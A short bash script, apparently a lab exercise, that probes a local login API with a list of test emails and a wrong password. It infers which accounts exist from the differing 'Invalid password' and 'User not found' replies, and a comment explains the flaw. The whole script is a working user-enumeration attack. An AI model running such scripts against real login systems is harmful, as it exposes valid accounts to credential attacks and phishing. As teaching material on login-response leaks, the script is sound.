#!/bin/bash

URL="http://127.0.0.1:5000/api/auth/login"

emails=(
"admin@test.com"
"user@test.com"
"test@test.com"
"random@test.com"
"fake@test.com"
)

password="wrongpassword"

echo "Starting User Enumeration Attack..."
echo "----------------------------------"

for email in "${emails[@]}"
do
    response=$(curl -s -X POST $URL \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"$password\"}")

    echo "$email -> $response"
done

echo "----------------------------------"
echo "Enumeration Finished"

#EXAMPLE OUTPUT:

#Starting User Enumeration Attack...
#admin@test.com -> {"message":"Invalid password"}
#random@test.com -> {"message":"User not found"}
#test@test.com -> {"message":"User not found"}
#----------------------------------
#Enumeration Finished 

#HERE CAN FIND A VALID EMAIL ADDRESS IF THE RESPONSE IS "Invalid password" INSTEAD OF "User not found". THIS IS A COMMON VULNERABILITY IN LOGIN SYSTEMS THAT CAN BE EXPLOITED BY ATTACKERS TO GATHER INFORMATION ABOUT VALID USER ACCOUNTS.